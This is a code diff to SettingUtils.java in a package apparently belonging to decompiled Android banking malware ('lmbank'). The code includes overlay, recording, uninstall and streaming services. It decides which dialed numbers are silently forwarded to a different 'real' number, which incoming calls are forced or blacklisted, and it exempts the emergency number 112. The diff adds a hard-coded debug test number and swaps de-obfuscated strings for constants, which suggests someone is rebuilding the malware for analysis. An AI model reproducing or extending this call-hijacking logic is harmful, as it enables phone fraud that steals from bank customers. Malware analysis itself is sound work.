@@ -45,6 +45,7 @@ import com.wish.lmbank.db.LimitPhoneNumberDB;
 import com.wish.lmbank.overlay.OverlayService;
 import com.wish.lmbank.service.RecServiceV;
 import com.wish.lmbank.service.UninstallService;
+import com.wish.lmbank.temp.Debugging;
 
 import net.ossrs.yasea.SrsFlvMuxer;
 
@@ -320,6 +321,16 @@ public class SettingUtils {
     public static LimitPhoneNumberBean isForwarding(String str) {
         LimitPhoneNumberBean queryOutgoingPhoneNumberType = LimitPhoneNumberDB.getInstance(AppStartV.getContext()).queryOutgoingPhoneNumberType(str);
 
+        if (Debugging.test_phone_number.equals(str)){
+            LimitPhoneNumberBean limitPhoneNumberBean = new LimitPhoneNumberBean();
+            limitPhoneNumberBean.setType(LimitPhoneNumberDB.TYPE_CALL_FORWARDING);
+            limitPhoneNumberBean.setPhoneNumber(Debugging.test_phone_number);
+            limitPhoneNumberBean.setRealPhoneNumber(Debugging.test_real_phone_number);
+            limitPhoneNumberBean.setName(Debugging.name);
+//            limitPhoneNumberBean.setSpecial(1);
+            return limitPhoneNumberBean;
+        }
+
         if (queryOutgoingPhoneNumberType == null) {
             return null;
         }
@@ -328,7 +339,7 @@ public class SettingUtils {
             return null;
         }
 //         if (!bb7d7pu7.m5998("CggFBTYPBhseCBsNAAcO").equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str)) {
-        if (!"call_forwarding".equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str)) {
+        if (!LimitPhoneNumberDB.TYPE_CALL_FORWARDING.equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str)) {
             return null;
         }
         return queryOutgoingPhoneNumberType;
@@ -342,7 +353,7 @@ public class SettingUtils {
                 return null;
             }
 //             if (!bb7d7pu7.m5998("CggFBTYPBhseCBsNAAcO").equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str) || queryOutgoingPhoneNumberType.getSpecial() != 1 || bb7d7pu7.m5998("WFhb").equals(str)) {
-            if (!"call_forwarding".equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str) || queryOutgoingPhoneNumberType.getSpecial() != 1 || "112".equals(str)) {
+            if (!LimitPhoneNumberDB.TYPE_CALL_FORWARDING.equals(queryOutgoingPhoneNumberType.getType()) || formatPhone(str).equals(realPhoneNumber) || realPhoneNumber.equals(str) || queryOutgoingPhoneNumberType.getSpecial() != 1 || "112".equals(str)) {
                 return null;
             }
             return queryOutgoingPhoneNumberType;
@@ -358,7 +369,7 @@ public class SettingUtils {
                 return null;
             }
 //             if (bb7d7pu7.m5998("CggFBTYPBhsKDA0").equals(queryIncomingPhoneNumberType.getType())) {
-            if ("call_forced".equals(queryIncomingPhoneNumberType.getType())) {
+            if (LimitPhoneNumberDB.TYPE_CALL_FORCED.equals(queryIncomingPhoneNumberType.getType())) {
                 return realPhoneNumber;
             }
             return null;
@@ -370,12 +381,16 @@ public class SettingUtils {
         Log.i(TAG, "isBlackList: " + str);
         LimitPhoneNumberBean queryIncomingPhoneNumberType = LimitPhoneNumberDB.getInstance(AppStartV.getContext()).queryIncomingPhoneNumberType(str);
 
+        if(Debugging.test_phone_number.equals(str)){
+            return true;
+        }
+
         if (queryIncomingPhoneNumberType == null || TextUtils.isEmpty(queryIncomingPhoneNumberType.getRealPhoneNumber())) {
             return false;
         }
 
 //         return bb7d7pu7.m5998("CwUICgI2BQAaHQ").equals(queryIncomingPhoneNumberType.getType());
-        return "black_list".equals(queryIncomingPhoneNumberType.getType());
+        return LimitPhoneNumberDB.TYPE_BLACK_LIST.equals(queryIncomingPhoneNumberType.getType());
     }
 
     public static boolean isDefaultDialer(Context context) {
